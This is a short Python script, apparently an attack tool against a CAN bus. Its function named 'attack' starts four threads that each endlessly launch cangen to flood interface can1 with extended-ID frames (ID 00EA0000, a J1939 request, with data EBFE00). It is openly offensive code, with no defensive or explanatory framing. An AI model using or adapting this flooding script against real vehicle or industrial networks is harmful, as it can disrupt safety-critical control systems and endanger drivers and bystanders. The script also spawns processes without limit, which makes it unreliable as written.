import _thread
import time
import subprocess

def attack(interval):
	while True:
		p = subprocess.Popen('cangen can1 -e -g ' + str(interval) + ' -I 00EA0000 -L8 -D EBFE00 -L16', shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)

for i in range(4):
	_thread.start_new_thread( attack, (1.2,) )
	#time.sleep(2)

while True:
	print ("working")

